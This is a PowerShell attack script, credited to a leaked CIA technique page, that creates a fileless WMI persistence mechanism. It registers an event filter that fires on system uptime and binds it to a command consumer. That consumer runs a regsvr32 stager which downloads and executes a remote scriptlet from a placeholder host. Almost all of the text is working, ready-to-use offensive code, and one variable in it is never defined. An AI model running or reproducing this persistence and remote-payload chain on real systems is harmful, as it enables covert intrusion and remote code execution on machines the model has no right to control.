# Fileless WMI Persistence (PSEDWMIEvent_SU - SystemUptime)
# https://wikileaks.org/ciav7p1/cms/page_14587908.html

<#
.SYNOPSIS
This script creates a persisted WMI event that executes a command upon trigger of the system's uptime being between a given range in seconds.  The event will trigger only once.  
#>

$EventFilterName = "Fileless WMI Persistence SystemUptime"

$StagerPayload = "C:\Windows\System32\regsvr32.exe /s /u /i:http://example.com/file.sct scrobj.dll"

# Create event filter
$EventFilterArgs = @{
    EventNamespace = 'root/cimv2'
    Name = $EventFilterName
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 320"
    QueryLanguage = 'WQL'
}

$Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $EventFilterArgs

# Create CommandLineEventConsumer
$CommandLineConsumerArgs = @{
    Name = $EventConsumerName
    CommandLineTemplate = $StagerPayload
}

$Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $CommandLineConsumerArgs

# Create FilterToConsumerBinding
$FilterToConsumerArgs = @{
    Filter = $Filter
    Consumer = $Consumer
}

$FilterToConsumerBinding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs